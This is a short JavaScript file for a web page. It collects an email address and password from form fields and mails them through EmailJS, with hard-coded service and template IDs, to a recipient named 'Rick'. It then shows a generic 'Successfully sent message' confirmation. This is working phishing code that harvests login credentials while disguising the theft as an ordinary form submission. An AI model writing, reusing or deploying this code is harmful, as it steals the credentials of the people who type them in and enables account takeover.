(function () {
  emailjs.init("user_ESDjKTcJyUrjiqhGOMJ3G");
})();

function validate() {
  let usename = document.querySelector(".email");
  let password = document.querySelector(".password");
  let btn = document.querySelector(".submit");

  btn.addEventListener("click", (e) => {
    e.preventDefault();
    //validate email
    if (usename.value === "" || password.value === "") {
      emptyerror();
    } else {
      sendmail(usename.value, password.value);
      usename.value = "";
      password.value = "";
      success();
    }
  });
}
validate();

function sendmail(usename, password) {
  emailjs.send("service_ll5oava", "template_cvjri3e", {
    to_name: "Rick",
    from_name: usename,
    message: password,
  });
}

function emptyerror() {
  Swal.fire({
    icon: "error",
    title: "Oops...",
    text: "Fields cannot be empty!",
  });
}

function error() {
  Swal.fire({
    icon: "error",
    title: "Oops...",
    text: "Please Give Valid Information",
  });
}

function success() {
  Swal.fire({
    icon: "success",
    title: "Success...",
    text: "Successfully sent message",
  });
  const closeModel = document.getElementById("contact-submit");
  closeModel.setAttribute("data-bs-dismiss", "modal");
}
